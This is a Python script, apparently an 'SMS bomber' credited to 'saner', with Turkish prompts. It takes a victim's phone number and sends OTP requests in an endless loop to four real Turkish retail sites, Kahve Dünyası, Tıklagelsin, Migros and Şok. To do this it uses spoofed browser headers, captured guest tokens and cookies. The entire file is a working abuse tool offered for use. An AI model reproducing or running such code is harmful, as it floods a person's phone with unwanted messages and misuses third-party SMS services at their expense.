import requests
import time
import os
from colorama import Fore, Back, Style
import threading

os.system('color')
os.system('cls')

print('''

                                                                                                                                               
                                                                                                                                               
PPPPPPPPPPPPPPPPP        000000000     WWWWWWWW                           WWWWWWWWEEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRR   ZZZZZZZZZZZZZZZZZZZ
P::::::::::::::::P     00:::::::::00   W::::::W                           W::::::WE::::::::::::::::::::ER::::::::::::::::R  Z:::::::::::::::::Z
P::::::PPPPPP:::::P  00:::::::::::::00 W::::::W                           W::::::WE::::::::::::::::::::ER::::::RRRRRR:::::R Z:::::::::::::::::Z
PP:::::P     P:::::P0:::::::000:::::::0W::::::W                           W::::::WEE::::::EEEEEEEEE::::ERR:::::R     R:::::RZ:::ZZZZZZZZ:::::Z 
  P::::P     P:::::P0::::::0   0::::::0 W:::::W           WWWWW           W:::::W   E:::::E       EEEEEE  R::::R     R:::::RZZZZZ     Z:::::Z  
  P::::P     P:::::P0:::::0     0:::::0  W:::::W         W:::::W         W:::::W    E:::::E               R::::R     R:::::R        Z:::::Z    
  P::::PPPPPP:::::P 0:::::0     0:::::0   W:::::W       W:::::::W       W:::::W     E::::::EEEEEEEEEE     R::::RRRRRR:::::R        Z:::::Z     
  P:::::::::::::PP  0:::::0 000 0:::::0    W:::::W     W:::::::::W     W:::::W      E:::::::::::::::E     R:::::::::::::RR        Z:::::Z      
  P::::PPPPPPPPP    0:::::0 000 0:::::0     W:::::W   W:::::W:::::W   W:::::W       E:::::::::::::::E     R::::RRRRRR:::::R      Z:::::Z       
  P::::P            0:::::0     0:::::0      W:::::W W:::::W W:::::W W:::::W        E::::::EEEEEEEEEE     R::::R     R:::::R    Z:::::Z        
  P::::P            0:::::0     0:::::0       W:::::W:::::W   W:::::W:::::W         E:::::E               R::::R     R:::::R   Z:::::Z         
  P::::P            0::::::0   0::::::0        W:::::::::W     W:::::::::W          E:::::E       EEEEEE  R::::R     R:::::RZZZ:::::Z     ZZZZZ
PP::::::PP          0:::::::000:::::::0         W:::::::W       W:::::::W         EE::::::EEEEEEEE:::::ERR:::::R     R:::::RZ::::::ZZZZZZZZ:::Z
P::::::::P           00:::::::::::::00           W:::::W         W:::::W          E::::::::::::::::::::ER::::::R     R:::::RZ:::::::::::::::::Z
P::::::::P             00:::::::::00              W:::W           W:::W           E::::::::::::::::::::ER::::::R     R:::::RZ:::::::::::::::::Z
PPPPPPPPPP               000000000                 WWW             WWW            EEEEEEEEEEEEEEEEEEEEEERRRRRRRR     RRRRRRRZZZZZZZZZZZZZZZZZZZ
                                                                                                                                               
                                                                                                                                               
                                                                                                                                               
                                                                                                                                               
                                                                                                                                               
developed by saner

''')

numara = int(input("Numarayı giriniz (+90) olmadan: "))

siteler = {
    "kahvedunyasi": "https://core.kahvedunyasi.com/api/users/sms/send",
    "tiklagelsin": "https://www.tiklagelsin.com/user/graphql",
    "migros": "https://www.migros.com.tr/rest/users/login/otp?reid=1673121724845000041",
    "sok": "https://api.ceptesok.com/api/users/sendsms"
}

def kahvedunyasi(numara):
    data = {
        "mobile_number": numara,
        "token_type": "register_token"
    }

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "tr-TR,tr;q=0.7",
        "Connection": "keep-alive",
        "Content-Length": "60",
        "Content-Type": "application/json;charset=UTF-8",
        "Guest-Token": "dPiNQ3wjPJubH37JNpoq93s3T2qQ4VUfVhsWjMJe",
        "Host": "core.kahvedunyasi.com",
        "Origin": "https://www.kahvedunyasi.com",
        "page-url": "/kayit-ol",
        "Positive-Client": "kahvedunyasi",
        "Positive-Client-Type": "web",
        "Referer": "https://www.kahvedunyasi.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Sec-GPC": "1",
        "store-id": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
    }

    r = requests.post(siteler["kahvedunyasi"], json=data, headers=headers)
    if r.status_code == 200:
        print("["+Fore.GREEN +"+" +Style.RESET_ALL+"] SMS başarıyla gönderildi.")
    else:
        print("["+Fore.RED +"-" +Style.RESET_ALL+"] SMS gönderilemedi.")

def tiklagelsin(numara):
    data = {
        "operationName": "GENERATE_OTP",
        "variables": {
            "phone": f"+90{numara}",
            "challenge": "66f4f3a8-3eec-40c8-a240-578d03a6ce4e",
            "deviceUniqueId": "web_1e4ad091-cbb2-46e6-8dd1-acd8b482c67f"
        },
        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
    }

    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "tr-TR,tr;q=0.6",
        "content-length": "385",
        "content-type": "application/json",
        "origin": "https://www.tiklagelsin.com",
        "referer": "https://www.tiklagelsin.com/a/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "x-device-type": "3",
        "x-merchant-type": "0",
        "x-no-auth": "true"
    }

    slm = requests.Session().post(siteler["tiklagelsin"], json=data, headers=headers)

    if slm.status_code == 200:
        print("["+Fore.GREEN +"+" +Style.RESET_ALL+"] SMS başarıyla gönderildi.")
    else:
        print("["+Fore.RED +"-" +Style.RESET_ALL+"] SMS gönderilemedi.")

def migros(numara):
    data = {
        "phoneNumber": f"{numara}"
    }

    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "tr-TR,tr",
        "content-length": "28",
        "content-type": "application/json",
        "cookie": "cookieSettings=%7B%22indicatorSeen%22%3Afalse%2C%22analyseCookies%22%3Afalse%2C%22marketingCookies%22%3Afalse%2C%22systemCookies%22%3Afalse%7D; VSTR_ID=dd41e4cb-6366-4dd5-b3cd-930dcc0400d7; CLIENT_SESSION_ID=12e810ba-32f5-4e63-861b-fb1e3bde583a",
        "origin": "https://www.migros.com.tr",
        "referer": "https://www.migros.com.tr/giris",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "x-forwarded-rest": "true",
        "x-pwa": "true"
    }

    slm = requests.Session().post(siteler["migros"], json=data, headers=headers)

    if slm.status_code == 200:
        print("["+Fore.GREEN +"+" +Style.RESET_ALL+"] SMS başarıyla gönderildi.")
    else:
        print("["+Fore.RED +"-" +Style.RESET_ALL+"] SMS gönderilemedi.")

def sok(numara):
    data = {
        "mobile_number": numara,
        "token_type": "login_token"
    }

    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "tr-TR,tr;q=0.5",
        "authorization": "Bearer false",
        "content-length": "57",
        "content-type": "application/json",
        "guest-token": "oGlNaeT3xUkvrtXQErW9ioGEKOrjrdRc8Okn8dTf",
        "origin": "https://www.sokmarket.com.tr",
        "positive-client": "ceptesok",
        "referer": "https://www.sokmarket.com.tr/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "sec-gpc": "1",
        "store-id": "14202",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
    }

    slm = requests.Session().post(siteler["sok"], json=data, headers=headers)

    if slm.status_code == 200:
        print("["+Fore.GREEN +"+" +Style.RESET_ALL+"] SMS başarıyla gönderildi.")
    else:
        print("["+Fore.RED +"-" +Style.RESET_ALL+"] SMS gönderilemedi.")


while True:
    for site in siteler:
        print(f"[{Fore.YELLOW}-{Style.RESET_ALL}] [{Fore.LIGHTRED_EX}{site}{Style.RESET_ALL}] sitesinden sms gönderiliyor...")
        if site == "kahvedunyasi":
            # kahvedunyasi(numara)
            t1 = threading.Thread(target=kahvedunyasi, args=(numara,))
            t1.start()
            t1.join()
        elif site == "tiklagelsin":
            # tiklagelsin(numara)
            t2 = threading.Thread(target=tiklagelsin, args=(numara,))
            t2.start()
            t2.join()
        elif site == "migros":
            # migros(numara)
            t3 = threading.Thread(target=migros, args=(numara,))
            t3.start()
            t3.join()
        elif site == "sok":
            # sok(numara)
            t4 = threading.Thread(target=sok, args=(numara,))
            t4.start()
            t4.join()
